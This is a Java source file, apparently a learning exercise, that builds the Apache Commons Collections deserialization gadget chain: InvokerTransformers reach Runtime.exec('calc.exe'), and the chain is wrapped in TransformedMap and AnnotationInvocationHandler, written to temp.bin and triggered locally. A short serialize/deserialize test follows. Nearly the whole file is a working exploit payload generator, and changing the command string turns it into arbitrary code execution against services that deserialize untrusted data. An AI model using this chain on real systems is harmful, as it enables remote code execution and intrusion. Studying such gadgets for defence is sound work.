package me.mica.learn;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class JavaSerializable {

    public static void main(String[] args) {

        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
            new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"calc.exe"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        innerMap.put("1", "zhanggf");
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

        try {
            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
            Object instance = ctor.newInstance(Target.class, outerMap);
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File("temp.bin")));
            objectOutputStream.writeObject(instance);
        } catch (ClassNotFoundException | NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }


        Map.Entry element = (Map.Entry) outerMap.entrySet().iterator().next();
        element.setValue("zhangdiao");
    }


    private void serializeTest() {
        String obj = "ls ";

        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("aa.ser"));
            os.writeObject(obj);
            os.close();


            ObjectInputStream is = new ObjectInputStream(new FileInputStream("aa.ser"));
            String mess = (String) is.readObject();
            System.out.println(mess);
            is.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

}
